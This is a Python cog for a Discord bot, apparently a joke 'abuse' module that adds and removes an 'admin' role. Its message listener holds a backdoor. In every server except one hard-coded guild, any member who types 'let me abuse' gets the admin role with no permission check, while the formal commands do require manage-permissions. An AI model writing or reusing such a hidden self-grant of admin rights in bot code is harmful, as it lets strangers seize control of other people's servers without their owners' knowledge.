# |------------------------------------------------------------------------------------|
# |                                                                                    |
# |                                                                                    |
# |                               Abuse Cog for Nogra Bot                              |
# |                                Written by Argon#0002                               |
# |                                Commands in this cog:                               |
# |                                 abuse, stopabusing                                 |
# |                                                                                    |
# |                                                                                    |
# |------------------------------------------------------------------------------------
import discord
from discord.ext import commands
import asyncio


class Abuse(commands.Cog):

    def __init__(self, client):
        self.client = client

    @commands.Cog.listener()
    async def on_message(self, message):
        if "let me abuse" in message.content:
            if message.guild.id == 830612362960437258:
                if message.author.id == 650647680837484556 or message.author.id == 697969807789654076:
                    var = discord.utils.get(message.guild.roles, name="admin")
                    await message.author.add_roles(var)
                    await message.channel.send("You can abuse now <:nograblushsuit:831001647005564970>")
                else:
                    await message.channel.send("Only Desteva or Argon can abuse in this server >:(")
            else:
                var = discord.utils.get(message.guild.roles, name="admin")
                await message.author.add_roles(var)
                await message.channel.send("You're worthy of aboosing, this server is shit anyways.")

        if "stop abusing" in message.content:
            var = discord.utils.get(message.guild.roles, name="admin")
            await message.author.remove_roles(var)
            await message.channel.send("Good boye")

    @commands.command(brief="gib power to aboos", description = "Gives admin role to a member")
    @commands.has_permissions(manage_permissions=True)
    async def abuse(self, ctx, member:discord.Member=None):
        if member is None:
            await ctx.send(
                "https://cdn.discordapp.com/attachments/797711768696651787/818796868758274059/unknown.png")
        else:
            var = discord.utils.get(ctx.guild.roles, name="admin")
            await member.add_roles(var)
            await ctx.send(
                f"{member.mention} {ctx.author.name} granted you the power of abuse here, have fun! <:nogracuteblush:806168390003064883>")

    @abuse.error
    async def abuse_error(self, ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.send("lmfao no you need \"manage permissions\" to let people abuse")
        else:
            await ctx.send(f"```diff\n- Error encountered!\n# erorr:\n+ {error}```")

    @commands.command(brief="Removes admin role to prevent aboos", description = "Removes admin role in a guild from a player to prevent abuse")
    @commands.has_permissions(manage_permissions=True)
    async def stopabusing(self, ctx, member: discord.Member = None):
        if member is None:
            await ctx.send(
                "https://cdn.discordapp.com/attachments/797711768696651787/818796868758274059/unknown.png")
        else:
            await ctx.send(
                f"{member.mention} {ctx.author.name} felt that you weren't worthy of abusing. <:nograhahausuck:819085149525245962>")
            var = discord.utils.get(ctx.guild.roles, name="admin")
            await member.remove_roles(var)

    @stopabusing.error
    async def stopabusing_error(self, ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.send("lmfao no you need \"manage permissions\" to stop people from wrecking the server")
        else:
            await ctx.send(f"```diff\n- Error encountered!\n# erorr:\n+ {error}```")

def setup(client):
    client.add_cog(Abuse(client))